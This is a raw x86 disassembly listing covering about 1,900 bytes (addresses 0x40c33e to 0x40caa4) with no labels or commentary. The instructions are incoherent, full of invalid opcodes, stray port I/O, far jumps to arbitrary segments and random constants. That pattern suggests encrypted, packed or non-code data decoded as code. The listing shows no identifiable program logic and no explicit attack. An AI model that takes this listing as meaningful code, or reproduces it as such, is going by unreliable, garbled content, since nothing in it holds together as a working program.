  40c33e:	cmp    BYTE PTR [edi],dl
  40c340:	out    dx,al
  40c341:	push   0x98604736
  40c346:	repnz pop ebp
  40c348:	mov    edi,DWORD PTR [ecx+0x15a87de3]
  40c34e:	mov    bh,0xe3
  40c350:	popf   
  40c351:	cmc    
  40c352:	lods   al,BYTE PTR ds:[esi]
  40c353:	retf   0xff4a
  40c356:	inc    eax
  40c357:	js     0x40c321
  40c359:	out    dx,al
  40c35a:	cmp    eax,0xcb4fc50b
  40c35f:	add    BYTE PTR [ecx],ah
  40c361:	lods   eax,DWORD PTR ds:[esi]
  40c362:	mov    ch,bh
  40c364:	sahf   
  40c365:	ret    0xef96
  40c368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c369:	xchg   ecx,eax
  40c36a:	pop    ebx
  40c36b:	out    dx,al
  40c36c:	not    al
  40c36e:	(bad)  
  40c36f:	adc    al,0xd8
  40c371:	enter  0x20c,0x15
  40c375:	std    
  40c376:	adc    al,0x5c
  40c378:	add    BYTE PTR [ebp+ebx*8-0x7b8846cd],dh
  40c37f:	jl     0x40c3c1
  40c381:	mov    ds:0x873da492,eax
  40c386:	or     eax,0x9aabc9fb
  40c38b:	sbb    edi,DWORD PTR [esi+0xf575431]
  40c391:	or     DWORD PTR [ebx],0x9a76a8a5
  40c397:	std    
  40c398:	stc    
  40c399:	cld    
  40c39a:	dec    esp
  40c39b:	pop    ss
  40c39c:	dec    BYTE PTR [ebx-0x33]
  40c39f:	adc    bh,BYTE PTR [eax]
  40c3a1:	aad    0xae
  40c3a3:	sti    
  40c3a4:	pop    edi
  40c3a5:	adc    BYTE PTR [ecx+0x6e4d7737],bh
  40c3ab:	jmp    0x9e8b:0xfb2daea8
  40c3b2:	dec    ebx
  40c3b3:	dec    ebx
  40c3b4:	cmp    DWORD PTR [esi+0x6fde025f],edi
  40c3ba:	push   ecx
  40c3bb:	xchg   DWORD PTR [edi],ebx
  40c3bd:	in     eax,0x27
  40c3bf:	or     al,0x32
  40c3c1:	pop    ss
  40c3c2:	cmp    cl,BYTE PTR [esp+eiz*4]
  40c3c5:	inc    edx
  40c3c6:	push   ds
  40c3c7:	cmp    eax,0x9e0d642e
  40c3cc:	cmp    ebx,edx
  40c3ce:	and    ebp,edx
  40c3d0:	gs cmp BYTE PTR gs:[ebp-0x5],dh
  40c3d5:	inc    eax
  40c3d6:	sbb    ebx,DWORD PTR [ebx]
  40c3d8:	mov    ch,0xc4
  40c3da:	and    DWORD PTR [eax+ecx*2],eax
  40c3dd:	std    
  40c3de:	add    ah,BYTE PTR [esi]
  40c3e0:	and    ecx,esp
  40c3e2:	sbb    al,0x5e
  40c3e4:	mov    cl,0x16
  40c3e6:	stc    
  40c3e7:	dec    ecx
  40c3e8:	inc    ecx
  40c3e9:	sub    DWORD PTR [edi-0x68],0x3f
  40c3ed:	mov    ch,0xb7
  40c3ef:	xchg   ebx,eax
  40c3f0:	lahf   
  40c3f1:	pop    ss
  40c3f2:	jle    0x40c3ef
  40c3f4:	leave  
  40c3f5:	pop    ebp
  40c3f6:	mov    ebx,ebp
  40c3f8:	ret    
  40c3f9:	adc    bl,BYTE PTR gs:[esp+edi*8]
  40c3fd:	movaps xmm1,XMMWORD PTR [edx-0x68805520]
  40c404:	or     cl,BYTE PTR [edi+0x5e31d7d8]
  40c40a:	in     eax,dx
  40c40b:	mov    eax,ds:0xc6bf29ff
  40c410:	mov    ebp,0x6949e188
  40c415:	jnp    0x40c488
  40c417:	mov    ds:0xcfe52491,eax
  40c41c:	sbb    ebx,DWORD PTR [edx-0x3b8d3908]
  40c422:	pop    ecx
  40c423:	push   esp
  40c424:	(bad)  
  40c425:	jp     0x40c438
  40c427:	lds    edx,FWORD PTR [edi]
  40c429:	mov    edx,0x14ad2fa7
  40c42e:	bound  edi,QWORD PTR ds:0xe0d7f8b3
  40c434:	test   DWORD PTR [esi-0x46],esi
  40c437:	popa   
  40c438:	cmp    al,0x97
  40c43a:	jl     0x40c3df
  40c43c:	loope  0x40c439
  40c43e:	test   BYTE PTR [ecx+edi*4+0x23],0x83
  40c443:	lds    esi,FWORD PTR [edi]
  40c445:	pop    ebp
  40c446:	cmc    
  40c447:	sub    al,0xea
  40c449:	cmp    esp,DWORD PTR [edi+0x25]
  40c44c:	pop    ebx
  40c44d:	ror    DWORD PTR [ebx-0x6513185b],cl
  40c453:	mov    DWORD PTR [eax+0x78eb7af5],edx
  40c459:	gs in  eax,0x94
  40c45c:	(bad)  
  40c45e:	push   es
  40c45f:	imul   ecx,DWORD PTR [ebx-0x23fa5e73],0x976b1250
  40c469:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c46a:	sub    eax,0x667e222e
  40c46f:	stos   DWORD PTR es:[edi],eax
  40c470:	mov    bl,0x78
  40c472:	add    edi,DWORD PTR [esi-0x327e29d4]
  40c478:	xor    ah,BYTE PTR ds:0x59c1e9d5
  40c47e:	xchg   edi,eax
  40c47f:	(bad)  
  40c481:	jle    0x40c4aa
  40c483:	dec    esi
  40c484:	dec    ecx
  40c485:	dec    edx
  40c486:	fadd   DWORD PTR [edi+0x25]
  40c489:	popa   
  40c48a:	jmp    0x3845:0x35b6b162
  40c491:	mov    BYTE PTR [edi-0x5f],cl
  40c494:	shr    DWORD PTR [ecx-0x788abb31],cl
  40c49a:	xor    DWORD PTR [esi],esi
  40c49c:	inc    edi
  40c49d:	push   esi
  40c49e:	push   0x1b
  40c4a0:	fstp   DWORD PTR [edx-0x3640034]
  40c4a6:	adc    al,0xb7
  40c4a8:	or     eax,0x4a44634
  40c4ad:	fistp  QWORD PTR [edi+edi*2]
  40c4b0:	scas   al,BYTE PTR es:[edi]
  40c4b1:	mov    dl,0xcf
  40c4b3:	enter  0x7066,0xca
  40c4b7:	or     bl,ch
  40c4b9:	sbb    eax,0x5017f7b5
  40c4be:	inc    ebp
  40c4bf:	mov    ds:0x1b9b2118,eax
  40c4c4:	xchg   ebp,eax
  40c4c5:	jle    0x40c51d
  40c4c7:	mov    edx,0x1a1082d0
  40c4cc:	lds    esi,FWORD PTR [esi+edi*8+0x13]
  40c4d0:	fst    st(2)
  40c4d2:	aas    
  40c4d3:	or     ah,BYTE PTR [edi]
  40c4d5:	xchg   edx,eax
  40c4d6:	rcl    ch,0xc
  40c4d9:	fisub  DWORD PTR [ebx+0x4686aa71]
  40c4df:	popf   
  40c4e0:	call   edi
  40c4e2:	scas   eax,DWORD PTR es:[edi]
  40c4e3:	pop    ebx
  40c4e4:	popf   
  40c4e5:	pop    esp
  40c4e6:	jo     0x40c55e
  40c4e8:	adc    DWORD PTR [edi-0x174bd7a2],edx
  40c4ee:	mov    dl,0x71
  40c4f0:	mov    esp,0xf4671668
  40c4f5:	push   ecx
  40c4f6:	loop   0x40c4de
  40c4f8:	das    
  40c4f9:	sub    al,0x5d
  40c4fb:	jl     0x40c500
  40c4fd:	pop    ebp
  40c4fe:	push   ebx
  40c4ff:	add    BYTE PTR [ebx-0xcee95df],cl
  40c505:	cmp    dh,ah
  40c507:	ror    BYTE PTR [eax-0x77de2ab7],cl
  40c50d:	mov    dh,0xbc
  40c50f:	ins    BYTE PTR es:[edi],dx
  40c510:	inc    esp
  40c511:	lods   eax,DWORD PTR ds:[esi]
  40c512:	push   eax
  40c513:	dec    esp
  40c514:	jmp    0xb62c:0x737d5677
  40c51b:	xor    edi,eax
  40c51d:	test   DWORD PTR [esi],ebp
  40c51f:	jmp    0x865a94c4
  40c524:	cmp    edi,DWORD PTR [eax+eiz*4-0x520910fc]
  40c52b:	out    0x7d,eax
  40c52d:	dec    ecx
  40c52e:	fs pop ebx
  40c530:	mov    ch,dl
  40c532:	jnp    0x40c58e
  40c534:	into   
  40c535:	push   ebp
  40c536:	fist   WORD PTR [edi+0x3600bee4]
  40c53c:	stos   DWORD PTR es:[edi],eax
  40c53d:	in     eax,dx
  40c53e:	ds ins BYTE PTR es:[edi],dx
  40c540:	jnp    0x40c563
  40c542:	mov    ecx,0x3d72e869
  40c547:	ja     0x40c58a
  40c549:	cmp    cl,dh
  40c54b:	add    DWORD PTR [edi+0x1134d30],esi
  40c551:	out    dx,al
  40c552:	mov    ebx,0xe89c3ac0
  40c557:	fninit 
  40c559:	adc    BYTE PTR [ecx],ch
  40c55b:	pop    eax
  40c55c:	aad    0xad
  40c55e:	icebp  
  40c55f:	into   
  40c560:	bound  edx,QWORD PTR [edi-0x5f6db59b]
  40c566:	jg     0x40c514
  40c568:	sahf   
  40c569:	(bad)  
  40c56a:	aad    0xdb
  40c56c:	in     al,dx
  40c56d:	pop    es
  40c56e:	sahf   
  40c56f:	xchg   ecx,eax
  40c570:	adc    al,0xe
  40c572:	mov    esi,0xefc5cc1d
  40c577:	test   DWORD PTR [esp+eax*4+0x71],esi
  40c57b:	or     DWORD PTR [edx+ebp*1],0xc5b1e12d
  40c582:	repz retf 
  40c584:	dec    ebp
  40c585:	ror    DWORD PTR [esi+0x231df7b3],1
  40c58b:	js     0x40c5ef
  40c58d:	jmp    0x1023:0x5cac2c6f
  40c594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c595:	cs test al,0xb0
  40c598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c59a:	cmp    eax,DWORD PTR [ebx]
  40c59c:	daa    
  40c59d:	lock retf 0xfc7a
  40c5a1:	stos   BYTE PTR es:[edi],al
  40c5a2:	arpl   bx,di
  40c5a4:	pop    ds
  40c5a5:	test   al,0xfd
  40c5a7:	shl    DWORD PTR [ecx],cl
  40c5a9:	add    BYTE PTR [eax],ah
  40c5ab:	mov    bl,0x49
  40c5ad:	jnp    0x40c60a
  40c5af:	les    esp,FWORD PTR [esi+0x48c963de]
  40c5b5:	and    DWORD PTR ds:0xa7089a10,edi
  40c5bb:	arpl   WORD PTR [edx],sp
  40c5bd:	outs   dx,BYTE PTR ds:[esi]
  40c5be:	stc    
  40c5bf:	loopne 0x40c63d
  40c5c1:	icebp  
  40c5c2:	adc    BYTE PTR [edi],0x33
  40c5c5:	cwde   
  40c5c6:	add    al,0xe
  40c5c8:	mov    ecx,0x51a421cc
  40c5cd:	(bad)  
  40c5ce:	cmp    DWORD PTR [ecx],edi
  40c5d0:	push   esp
  40c5d1:	xchg   esi,eax
  40c5d2:	dec    edi
  40c5d3:	shl    DWORD PTR [edi],0x9c
  40c5d6:	push   eax
  40c5d7:	nop
  40c5d8:	jne    0x40c5d5
  40c5da:	lahf   
  40c5db:	je     0x40c58e
  40c5dd:	mov    dl,0x5f
  40c5df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5e0:	int    0x43
  40c5e2:	(bad)  
  40c5e3:	or     esi,DWORD PTR [edx-0x1ca504]
  40c5e9:	loop   0x40c57b
  40c5eb:	jo     0x40c5d2
  40c5ed:	cmp    dh,ch
  40c5ef:	push   edi
  40c5f0:	lods   al,BYTE PTR ds:[esi]
  40c5f1:	or     eax,0x87ccb72
  40c5f6:	xchg   ebp,eax
  40c5f7:	sub    BYTE PTR [edi+ebx*8],ch
  40c5fa:	pop    eax
  40c5fb:	icebp  
  40c5fc:	imul   ebx,DWORD PTR [eax],0xffffffc4
  40c5ff:	jmp    0x7af1:0x4f9dc2ec
  40c606:	mov    bh,0xcb
  40c608:	inc    ecx
  40c609:	sahf   
  40c60a:	jns    0x40c5dd
  40c60c:	test   BYTE PTR [ebx+0x59],dh
  40c60f:	out    dx,eax
  40c610:	ja     0x40c679
  40c612:	add    al,0x34
  40c614:	adc    bh,BYTE PTR [edi-0x75]
  40c617:	jmp    0x40c600
  40c619:	cmp    al,0x5f
  40c61b:	push   ebx
  40c61c:	push   ebp
  40c61d:	movs   DWORD PTR es:[di],DWORD PTR fs:[si]
  40c620:	cmp    al,BYTE PTR [eax+0x76]
  40c623:	pusha  
  40c624:	nop
  40c625:	lds    edi,FWORD PTR [ebx-0x11d43921]
  40c62b:	adc    esp,DWORD PTR [edi]
  40c62d:	clc    
  40c62e:	paddusb mm4,mm2
  40c631:	and    eax,0xf53149dd
  40c636:	call   DWORD PTR ds:0x463fa385
  40c63c:	repz push ds
  40c63e:	push   0xffffff93
  40c640:	idiv   ebx
  40c642:	loope  0x40c5ff
  40c644:	mov    ah,0x69
  40c646:	xor    al,0x2f
  40c648:	and    eax,0xac21c334
  40c64d:	fadd   st(0),st
  40c64f:	mov    dl,0x50
  40c651:	aam    0x2f
  40c653:	int    0x9a
  40c655:	sbb    DWORD PTR ds:0x5522ad68,ecx
  40c65b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c65c:	fwait
  40c65d:	or     cl,bh
  40c65f:	sbb    dh,cl
  40c661:	mov    al,ds:0x6cffd9b0
  40c666:	adc    DWORD PTR [edx+0x64],0xe2e279ba
  40c66d:	pop    ss
  40c66e:	cmp    ebp,edi
  40c670:	dec    ebp
  40c671:	jns    0x40c628
  40c673:	cmp    dh,BYTE PTR [eax-0x47]
  40c676:	mov    ecx,0xc36080b
  40c67b:	xchg   esp,eax
  40c67c:	lahf   
  40c67d:	sub    BYTE PTR [edx-0x1a],ah
  40c680:	push   esi
  40c681:	inc    ebx
  40c682:	(bad)  
  40c683:	mov    dh,0x81
  40c685:	hlt    
  40c686:	add    al,ch
  40c688:	mov    bl,0x73
  40c68a:	xchg   esi,eax
  40c68b:	mov    ds:0xd813e774,eax
  40c690:	test   eax,0x80200d73
  40c695:	pusha  
  40c696:	and    al,0x61
  40c698:	(bad)  
  40c699:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c69a:	std    
  40c69b:	test   eax,0x732f1163
  40c6a0:	jge    0x40c655
  40c6a2:	add    edi,esi
  40c6a4:	cmp    esi,DWORD PTR [esi-0x66]
  40c6a7:	xor    eax,0x7bba60f
  40c6ac:	out    0x20,al
  40c6ae:	das    
  40c6af:	adc    esi,eax
  40c6b1:	cld    
  40c6b2:	fcmove st,st(6)
  40c6b4:	pop    ss
  40c6b5:	push   0x2c
  40c6b7:	(bad)  
  40c6b8:	fst    QWORD PTR [esp+eiz*4+0xa]
  40c6bc:	add    ch,BYTE PTR [ebp-0x120aba2a]
  40c6c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6c3:	fisub  WORD PTR [ecx+0x15]
  40c6c6:	and    edx,DWORD PTR [edi+0x378771dd]
  40c6cc:	sar    BYTE PTR [ebp+0x72],cl
  40c6cf:	pop    esp
  40c6d0:	popf   
  40c6d1:	aad    0x74
  40c6d3:	and    ecx,ecx
  40c6d5:	jecxz  0x40c681
  40c6d7:	test   al,0xee
  40c6d9:	xlat   BYTE PTR ds:[ebx]
  40c6da:	rcr    BYTE PTR [eax-0x63],0x90
  40c6de:	inc    edx
  40c6df:	mov    BYTE PTR [esi-0x625a221a],ah
  40c6e5:	pop    edi
  40c6e6:	sub    eax,0x7b6ae040
  40c6eb:	mov    ecx,0x1e7241f0
  40c6f0:	dec    esi
  40c6f2:	popa   
  40c6f3:	fidivr DWORD PTR [edi-0x29ed7d9d]
  40c6f9:	xor    DWORD PTR [edi+ebp*4+0x11b97442],esp
  40c700:	dec    ecx
  40c701:	cmp    BYTE PTR ds:0xe0dbe03b,dl
  40c707:	xor    BYTE PTR [ecx+0x7212102b],ch
  40c70d:	inc    edi
  40c70e:	mov    ebx,0x8503ad6d
  40c713:	lea    eax,[ebx-0x5b]
  40c716:	scas   eax,DWORD PTR es:[edi]
  40c717:	aad    0x80
  40c719:	xor    ebp,DWORD PTR [edi]
  40c71b:	cdq    
  40c71c:	and    ch,dh
  40c71e:	jp     0x40c71a
  40c720:	cmp    eax,0x17f3b8b8
  40c725:	iret   
  40c726:	adc    al,0x2b
  40c728:	jp     0x40c74b
  40c72a:	(bad)  
  40c72b:	mov    ebx,0xe7ab7f28
  40c730:	xor    BYTE PTR [ebp+0x3c],dl
  40c733:	rcl    esp,1
  40c735:	dec    ebx
  40c736:	fadd   QWORD PTR [edi]
  40c738:	sub    BYTE PTR [ebp+0x5c],0x2d
  40c73c:	mov    esp,0xa75819a6
  40c741:	xor    eax,0x31ce6bea
  40c746:	pusha  
  40c747:	lea    esi,[esi+0x37]
  40c74a:	(bad)  
  40c74b:	rep lods al,BYTE PTR ds:[esi]
  40c74d:	repnz imul esp,DWORD PTR [ebx-0x3d],0xffffffcb
  40c752:	jo     0x40c6f5
  40c754:	jmp    0x812d0534
  40c759:	mov    esi,0xf9332de8
  40c75e:	xchg   esp,edx
  40c760:	shr    eax,cl
  40c762:	jae    0x40c71b
  40c764:	add    eax,0xfc76065c
  40c769:	pushf  
  40c76a:	test   eax,0x5f3ba38c
  40c76f:	and    al,0xa7
  40c771:	lds    edi,FWORD PTR [esi+0x6d]
  40c774:	inc    edi
  40c775:	xchg   edi,eax
  40c776:	xor    al,0x1e
  40c778:	(bad)  [ebx-0x71]
  40c77b:	and    DWORD PTR [edi+0x50],ebx
  40c77e:	or     DWORD PTR [eax-0x62117233],ebx
  40c784:	and    bh,BYTE PTR [edi-0x17e534f8]
  40c78a:	mov    eax,0xc9317130
  40c78f:	mov    edx,0x8562e245
  40c794:	stos   BYTE PTR es:[edi],al
  40c795:	pop    ebx
  40c796:	fwait
  40c797:	jne    0x40c799
  40c799:	jae    0x40c73a
  40c79b:	push   ds
  40c79c:	jbe    0x40c7b8
  40c79e:	lods   eax,DWORD PTR ds:[esi]
  40c79f:	add    BYTE PTR [eax],ch
  40c7a1:	in     al,0x9
  40c7a3:	and    BYTE PTR [ebx-0x13],ah
  40c7a6:	jle    0x40c7ff
  40c7a8:	mov    dh,0xf8
  40c7aa:	mov    dl,0x30
  40c7ac:	cmp    DWORD PTR [ecx],edx
  40c7ae:	dec    ecx
  40c7af:	mov    BYTE PTR [edx-0x519ca352],dl
  40c7b5:	add    esi,0xe86fa196
  40c7bb:	inc    eax
  40c7bc:	or     bl,0x7f
  40c7bf:	jb     0x40c7ec
  40c7c1:	sub    eax,0x1b581f04
  40c7c6:	fild   QWORD PTR [ebp+ebx*2+0x26652a52]
  40c7cd:	das    
  40c7ce:	pop    esi
  40c7cf:	push   edi
  40c7d0:	mov    cl,0xa6
  40c7d2:	jl     0x40c84e
  40c7d4:	hlt    
  40c7d5:	dec    ebx
  40c7d6:	push   esi
  40c7d7:	retf   0x2570
  40c7da:	add    al,0xba
  40c7dc:	fxch   st(6)
  40c7de:	pop    ebx
  40c7df:	fcmove st,st(3)
  40c7e1:	ins    BYTE PTR es:[edi],dx
  40c7e2:	out    dx,al
  40c7e3:	shr    DWORD PTR [edi+0x4aa7a3c2],0xb6
  40c7ea:	push   0xcb80c79
  40c7ef:	add    BYTE PTR es:[esi],al
  40c7f2:	out    dx,eax
  40c7f3:	mov    edx,DWORD PTR [edi]
  40c7f5:	imul   eax,ecx,0x63f49961
  40c7fb:	push   cs
  40c7fc:	push   0x18
  40c7fe:	dec    edx
  40c7ff:	int    0x73
  40c801:	das    
  40c802:	imul   edi,DWORD PTR [eax],0x9023a72d
  40c808:	mov    al,ds:0xe3e9cbc4
  40c80d:	icebp  
  40c80e:	scas   eax,DWORD PTR es:[edi]
  40c80f:	repz mov eax,0xe4659383
  40c815:	push   ebx
  40c816:	xchg   BYTE PTR ds:0x5ebddf66,ah
  40c81c:	ins    DWORD PTR es:[edi],dx
  40c81d:	sub    DWORD PTR [edx+edi*8-0x29e5c148],ebx
  40c824:	in     eax,0x48
  40c826:	js     0x40c7b5
  40c828:	scas   al,BYTE PTR es:[edi]
  40c829:	mov    esi,0xfbd84e5b
  40c82e:	data16 sbb BYTE PTR [ebx+0x2ac49a4a],al
  40c835:	push   cs
  40c836:	dec    ebx
  40c837:	fmul   QWORD PTR [edi+0x42e9cb25]
  40c83d:	clc    
  40c83e:	xchg   esp,eax
  40c83f:	sbb    eax,0xa25b495a
  40c844:	xchg   edi,eax
  40c845:	push   edi
  40c846:	out    0x43,eax
  40c848:	jno    0x40c871
  40c84a:	lock sub BYTE PTR [eax-0xc],ah
  40c84e:	stos   BYTE PTR es:[edi],al
  40c84f:	lea    ebp,[eax]
  40c851:	std    
  40c852:	cmp    edi,esp
  40c854:	fiadd  DWORD PTR [esi-0x60]
  40c857:	inc    ebp
  40c858:	rcl    DWORD PTR [ebp-0x6d],cl
  40c85b:	dec    edi
  40c85c:	cmp    eax,0x528d4f90
  40c861:	inc    ebp
  40c862:	adc    esi,DWORD PTR [edx]
  40c864:	mov    ss,WORD PTR [eax-0x38]
  40c867:	xchg   edi,eax
  40c868:	pop    edi
  40c869:	xor    esi,DWORD PTR [ebx-0x45]
  40c86c:	sbb    eax,0x2806c4f4
  40c871:	cmp    DWORD PTR [edi],0xffffff85
  40c874:	ds add al,0x45
  40c877:	cmp    eax,0x656d4c5d
  40c87c:	or     ebx,DWORD PTR ds:0x87ee6885
  40c882:	int3   
  40c883:	xchg   esp,eax
  40c884:	jle    0x40c853
  40c886:	in     ax,0xc0
  40c889:	rcr    BYTE PTR [ebx],cl
  40c88b:	xor    cl,dl
  40c88d:	add    DWORD PTR [ebx-0x3c],ecx
  40c890:	push   edx
  40c891:	dec    ecx
  40c892:	neg    DWORD PTR [ebx]
  40c894:	daa    
  40c895:	test   eax,0xa4dffef9
  40c89a:	pop    ecx
  40c89b:	les    edx,FWORD PTR [esi+0x4]
  40c89e:	lods   al,BYTE PTR ds:[esi]
  40c89f:	xchg   edi,eax
  40c8a0:	pop    ebp
  40c8a1:	loop   0x40c893
  40c8a3:	(bad)
  40c8a8:	push   esp
  40c8a9:	aaa    
  40c8aa:	aas    
  40c8ab:	mov    ds:0x9d1fa89e,al
  40c8b0:	cmp    eax,0x82e1bf71
  40c8b5:	test   DWORD PTR [edi-0x45],edx
  40c8b8:	mov    cl,0x14
  40c8ba:	sub    al,BYTE PTR [edi-0x56]
  40c8bd:	pop    es
  40c8be:	(bad)  
  40c8bf:	hlt    
  40c8c0:	sub    DWORD PTR [edx+0x10e97258],0x34
  40c8c7:	jo     0x40c90f
  40c8c9:	ret    0xa6d3
  40c8cc:	sbb    ax,0xd695
  40c8d0:	lea    edx,[edx-0x41]
  40c8d3:	lods   al,BYTE PTR ds:[esi]
  40c8d4:	jb     0x40c899
  40c8d6:	stc    
  40c8d7:	(bad)  
  40c8d8:	pop    ebp
  40c8d9:	mov    ch,0xc4
  40c8db:	call   0x82423490
  40c8e0:	or     dh,ch
  40c8e2:	daa    
  40c8e3:	test   dl,dl
  40c8e5:	loop   0x40c92b
  40c8e7:	das    
  40c8e8:	mov    BYTE PTR [edi-0x46],dh
  40c8eb:	into   
  40c8ec:	ds mov esi,0x8f47975f
  40c8f2:	pop    esi
  40c8f3:	adc    DWORD PTR [esi-0xb],edi
  40c8f6:	enter  0x3347,0x18
  40c8fa:	inc    edx
  40c8fb:	repnz mov ch,0x81
  40c8fe:	mov    es,WORD PTR [edi+0x788875c4]
  40c904:	or     ch,BYTE PTR [edi+0x4cdfd8d8]
  40c90a:	out    dx,al
  40c90b:	xchg   ebx,eax
  40c90c:	or     BYTE PTR [ebx],al
  40c90e:	push   es
  40c90f:	fisttp DWORD PTR [eax+0x62]
  40c912:	jle    0x40c985
  40c914:	test   eax,0xb662320f
  40c919:	cmp    DWORD PTR [edx-0x5d],esp
  40c91c:	in     al,0x59
  40c91e:	sbb    bh,BYTE PTR [ebx+eax*8+0x2a6044a]
  40c925:	test   DWORD PTR [eax+0x1c6cffee],esp
  40c92b:	xor    DWORD PTR [ecx-0x4a75f19],esp
  40c931:	mov    eax,ds:0x3140361c
  40c936:	mov    es,ecx
  40c938:	push   ebx
  40c939:	or     ch,BYTE PTR [ecx-0x768ea069]
  40c93f:	pop    es
  40c940:	retf   0xf1d4
  40c943:	or     BYTE PTR [ebp+0x51],cl
  40c946:	push   ebp
  40c947:	pop    ss
  40c948:	adc    ah,BYTE PTR [edi]
  40c94a:	hlt    
  40c94b:	cdq    
  40c94c:	mov    dh,BYTE PTR [edx-0x7c]
  40c94f:	nop
  40c950:	cmp    eax,0x504d766e
  40c955:	shl    BYTE PTR [ecx-0x29],cl
  40c958:	imul   esi,ebx,0xffffff8f
  40c95b:	mov    dl,0xe2
  40c95d:	(bad)  
  40c95e:	or     edx,DWORD PTR [ecx+0x991d406]
  40c964:	(bad)  
  40c965:	mov    ecx,0xa34a90e8
  40c96a:	cmp    DWORD PTR [ecx+0x5d3eed2b],ecx
  40c970:	push   ebp
  40c971:	sub    ch,BYTE PTR [ebx]
  40c973:	pop    edi
  40c974:	ret    
  40c975:	pop    edx
  40c976:	mov    ch,0x32
  40c978:	push   ebp
  40c979:	or     ch,BYTE PTR [eax+0x1e]
  40c97c:	jle    0x40c934
  40c97e:	push   cs
  40c97f:	dec    esi
  40c980:	js     0x40c95f
  40c982:	sti    
  40c983:	add    bh,cl
  40c985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c986:	push   0x18
  40c988:	jbe    0x40c99f
  40c98a:	jmp    0x40c990
  40c98c:	lea    ebp,[ecx-0x36]
  40c98f:	sbb    DWORD PTR [edi],ebx
  40c991:	in     eax,0xc7
  40c993:	(bad)  
  40c995:	enter  0x6d62,0xf3
  40c999:	adc    eax,0x8053b3a3
  40c99e:	in     al,dx
  40c99f:	stc    
  40c9a0:	ins    DWORD PTR es:[edi],dx
  40c9a1:	ins    DWORD PTR es:[edi],dx
  40c9a2:	lods   eax,DWORD PTR ds:[esi]
  40c9a3:	xchg   ecx,eax
  40c9a4:	repz sub BYTE PTR ds:0x7e1f7d9c,cl
  40c9ab:	jnp    0x40c994
  40c9ad:	test   al,0x2e
  40c9af:	mov    edx,0x6df904c8
  40c9b4:	les    esi,FWORD PTR [ecx-0x9d52eda]
  40c9ba:	pop    eax
  40c9bb:	(bad)  
  40c9bc:	inc    edi
  40c9bd:	leave  
  40c9be:	mov    eax,ds:0xf95f8be0
  40c9c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c4:	inc    BYTE PTR [edi+eax*4-0x39]
  40c9c8:	lock jno 0x40c9e8
  40c9cb:	mov    dh,0x2a
  40c9cd:	xor    eax,0x1032e181
  40c9d2:	std    
  40c9d3:	pop    ds
  40c9d4:	icebp  
  40c9d5:	mov    ah,0x37
  40c9d7:	dec    ecx
  40c9d8:	pop    edx
  40c9d9:	aas    
  40c9da:	ror    cl,1
  40c9dc:	xchg   esp,eax
  40c9dd:	pop    esi
  40c9de:	ficomp WORD PTR [eax]
  40c9e0:	sbb    al,0x37
  40c9e2:	cmp    al,0x61
  40c9e4:	cmp    bl,BYTE PTR [edx]
  40c9e6:	or     dh,BYTE PTR [edi+0x4d56ff7b]
  40c9ec:	mov    al,ds:0x2a76807c
  40c9f1:	mov    dl,BYTE PTR [ecx]
  40c9f3:	mov    dh,0x43
  40c9f5:	xor    BYTE PTR [eax+0x2c],bh
  40c9f8:	xchg   esp,eax
  40c9f9:	pop    ds
  40c9fa:	std    
  40c9fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9fc:	add    al,0xf7
  40c9fe:	bound  ebp,QWORD PTR [eax+0x2499d776]
  40ca04:	sbb    DWORD PTR [ebp-0x2b],edi
  40ca07:	mov    ebp,0x5533cd12
  40ca0c:	jge    0x40ca58
  40ca0e:	add    DWORD PTR ds:0x4bed6210,ecx
  40ca14:	sbb    bh,bh
  40ca16:	mov    esi,ebx
  40ca18:	loopne 0x40ca7c
  40ca1a:	push   0x6c
  40ca1c:	(bad)  
  40ca1d:	jge    0x40c9ab
  40ca1f:	mov    edx,0x74e640a5
  40ca24:	mov    ebx,0xe833f6dc
  40ca29:	mov    ecx,0x441735f3
  40ca2e:	pop    ebp
  40ca2f:	push   esp
  40ca30:	call   0xca6d:0x884c9f9b
  40ca37:	dec    ecx
  40ca38:	ficom  DWORD PTR [edx]
  40ca3a:	add    eax,0x3176c321
  40ca3f:	add    eax,0x9cad2d9a
  40ca44:	push   ebx
  40ca45:	imul   edx,DWORD PTR [ebx-0x72],0xffffffa6
  40ca49:	or     al,0xe9
  40ca4b:	in     eax,dx
  40ca4c:	(bad)  
  40ca4d:	fcom   DWORD PTR [ecx]
  40ca4f:	retf   
  40ca50:	(bad)  
  40ca51:	push   cs
  40ca52:	inc    edi
  40ca53:	arpl   WORD PTR [ebx-0x75],cx
  40ca56:	pushf  
  40ca57:	cmp    dl,BYTE PTR ds:0xe949580a
  40ca5d:	ja     0x40c9ea
  40ca5f:	jns    0x40ca27
  40ca61:	or     eax,0xf869ef80
  40ca66:	xor    BYTE PTR [ebx+esi*4],bh
  40ca69:	retf   
  40ca6a:	adc    al,BYTE PTR [edx]
  40ca6c:	inc    ebx
  40ca6d:	mov    WORD PTR [ecx-0x43],?
  40ca70:	mov    ch,0x24
  40ca72:	dec    esp
  40ca73:	add    ebp,DWORD PTR [ecx]
  40ca75:	add    BYTE PTR [edi-0x6a],bh
  40ca78:	ret    
  40ca79:	ins    DWORD PTR es:[edi],dx
  40ca7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca7b:	pushf  
  40ca7c:	mov    edi,0xecadf6ac
  40ca81:	stos   DWORD PTR es:[edi],eax
  40ca82:	shl    BYTE PTR [ebx],cl
  40ca84:	and    eax,0x19f1d2b1
  40ca89:	popa   
  40ca8a:	jae    0x40cad7
  40ca8c:	cmp    ah,al
  40ca8e:	add    ecx,ebp
  40ca90:	inc    ebp
  40ca91:	lock sar BYTE PTR [eax-0x4],1
  40ca95:	sbb    al,0xfa
  40ca97:	aad    0x6b
  40ca99:	push   esi
  40ca9a:	or     al,0xfa
  40ca9c:	loope  0x40ca54
  40ca9e:	push   ss
  40ca9f:	add    ecx,DWORD PTR [ebx+0x54]
  40caa2:	dec    esp
  40caa3:	dec    eax
  40caa4:	in     eax,0x2a
